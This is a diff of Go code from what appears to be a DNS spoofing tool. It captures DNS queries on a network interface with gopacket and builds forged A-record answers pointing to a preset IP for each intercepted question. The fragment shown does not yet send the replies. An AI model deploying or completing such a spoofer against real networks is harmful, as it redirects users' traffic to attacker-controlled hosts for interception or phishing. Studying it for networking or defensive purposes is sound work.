@@ -79,6 +79,13 @@ func spoof(ifacename string) {
 	// get the channel source from the card
 	pktSource := gopacket.NewPacketSource(handle, handle.LinkType())
 
+	// pre-create the response with most of the data filled out
+	var a layers.DNSResourceRecord
+	a.Type = layers.DNSTypeA
+	a.Class = layers.DNSClassIN
+	a.TTL = 300
+	a.IP = ip
+
 	// Main loop for dns packets intercepted
 	for packet := range pktSource.Packets() {
 
@@ -96,7 +103,28 @@ func spoof(ifacename string) {
 			continue;
 		}
 
-		// print the data
-		fmt.Println(dnsPkt)
+		// print the question section
+		for i := uint16(0); i < dnsPkt.QDCount; i++ {
+			fmt.Println(string(dnsPkt.Questions[i].Name))
+		}
+
+		// for each question
+		for i := uint16(0); i < dnsPkt.QDCount; i++ {
+
+			// get the question
+			q := dnsPkt.Questions[i]
+
+			// verify this is an A-IN record question
+			if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
+				continue;
+			}
+
+			// copy the name across to the response
+			a.Name = q.Name
+
+			// append the answer to the original query packet
+			dnsPkt.Answers = append(dnsPkt.Answers, a)
+
+		}
 	}
 }
